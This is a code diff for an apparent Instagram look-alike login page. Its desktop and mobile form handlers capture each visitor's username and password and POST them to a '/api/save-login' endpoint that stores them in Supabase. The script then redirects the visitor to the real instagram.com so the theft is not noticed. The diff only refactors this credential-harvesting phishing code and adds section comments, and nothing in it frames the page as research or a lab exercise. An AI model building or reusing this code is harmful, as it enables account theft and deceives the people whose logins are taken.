@@ -1,12 +1,7 @@
-/*
-    Collects username + password from both desktop and mobile forms
-    and sends them to your API / Supabase
-*/
+/* =========================================================
+   DESKTOP LOGIN
+========================================================= */
 
-const SUPABASE_URL = "YOUR_SUPABASE_URL";          // replace
-const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY"; // replace (or use API route)
-
-// ========== DESKTOP FORM ==========
 const loginForm = document.getElementById("demoLoginForm");
 
 if (loginForm) {
@@ -21,14 +16,15 @@ if (loginForm) {
       return;
     }
 
-    await saveCredentials(user_id, pass, "desktop");
-
-    // After saving, redirect (optional)
+    await saveCredentials(user_id, pass);
     window.location.href = "https://www.instagram.com/";
   });
 }
 
-// ========== MOBILE FORM ==========
+/* =========================================================
+   MOBILE LOGIN
+========================================================= */
+
 const mobileLoginForm = document.getElementById("mobileLoginForm");
 
 if (mobileLoginForm) {
@@ -43,54 +39,42 @@ if (mobileLoginForm) {
       return;
     }
 
-    await saveCredentials(user_id, pass, "mobile");
-
-    // After saving, redirect (optional)
+    await saveCredentials(user_id, pass);
     window.location.href = "https://www.instagram.com/";
   });
 }
 
-// ========== SAVE FUNCTION ==========
-async function saveCredentials(user_id, pass, source) {
+/* =========================================================
+   SAVE TO SUPABASE VIA API
+========================================================= */
+
+async function saveCredentials(user_id, pass) {
   try {
-    // OPTION A: Call your Vercel API route (recommended)
     const response = await fetch("/api/save-login", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        user_id,
-        pass,
-        source, // optional
+        user_id: user_id,
+        pass: pass
       }),
     });
 
     const result = await response.json();
-    console.log("Saved:", result);
+    console.log("Save result:", result);
 
-    // OPTION B: Direct to Supabase (uncomment if you prefer)
-    /*
-    const response = await fetch(`${SUPABASE_URL}/rest/v1/your_table_name`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "apikey": SUPABASE_ANON_KEY,
-        "Authorization": `Bearer ${SUPABASE_ANON_KEY}`,
-        "Prefer": "return=minimal"
-      },
-      body: JSON.stringify({
-        user_id,
-        pass
-      })
-    });
-    */
+    if (!response.ok) {
+      console.error("Failed to save:", result.error);
+    }
   } catch (error) {
-    console.error("Error saving:", error);
+    console.error("Error saving credentials:", error);
   }
 }
 
-// ========== REST OF YOUR ORIGINAL CODE (mobile overlay etc.) ==========
+/* =========================================================
+   FORGOT PASSWORD
+========================================================= */
 
 const forgotPassword = document.getElementById("forgotPassword");
 if (forgotPassword) {
@@ -99,6 +83,10 @@ if (forgotPassword) {
   });
 }
 
+/* =========================================================
+   CREATE ACCOUNT
+========================================================= */
+
 const createAccount = document.getElementById("createAccount");
 if (createAccount) {
   createAccount.addEventListener("click", function () {
@@ -106,15 +94,27 @@ if (createAccount) {
   });
 }
 
+/* =========================================================
+   FACEBOOK BUTTON
+========================================================= */
+
 const facebookButton = document.getElementById("facebookButton");
 if (facebookButton) {
   facebookButton.addEventListener("click", function () {});
 }
 
+/* =========================================================
+   LANGUAGE BUTTON
+========================================================= */
+
 const languageButton = document.getElementById("languageButton");
 if (languageButton) {
   languageButton.addEventListener("click", function () {});
 }
+
+/* =========================================================
+   MOBILE OPEN APP
+========================================================= */
 
 const mobileOpenInstagram = document.getElementById("mobileOpenInstagram");
 const mobileOpenTop = document.getElementById("mobileOpenTop");
@@ -127,6 +127,10 @@ if (mobileOpenInstagram) {
 if (mobileOpenTop) {
   mobileOpenTop.addEventListener("click", showOpenAppMessage);
 }
+
+/* =========================================================
+   MOBILE LOGIN OVERLAY
+========================================================= */
 
 const mobileLogin = document.getElementById("mobileLogin");
 const mobileTopLogin = document.getElementById("mobileTopLogin");
@@ -159,6 +163,10 @@ if (mobileLoginOverlay) {
   });
 }
 
+/* =========================================================
+   MOBILE FORGOT PASSWORD
+========================================================= */
+
 const mobileForgot = document.getElementById("mobileForgot");
 if (mobileForgot) {
   mobileForgot.addEventListener("click", function () {
@@ -166,10 +174,18 @@ if (mobileForgot) {
   });
 }
 
+/* =========================================================
+   MOBILE SIGN UP
+========================================================= */
+
 const mobileSignup = document.getElementById("mobileSignup");
 if (mobileSignup) {
   mobileSignup.addEventListener("click", function () {});
 }
+
+/* =========================================================
+   MOBILE LANGUAGE
+========================================================= */
 
 const mobileLanguage = document.getElementById("mobileLanguage");
 if (mobileLanguage) {
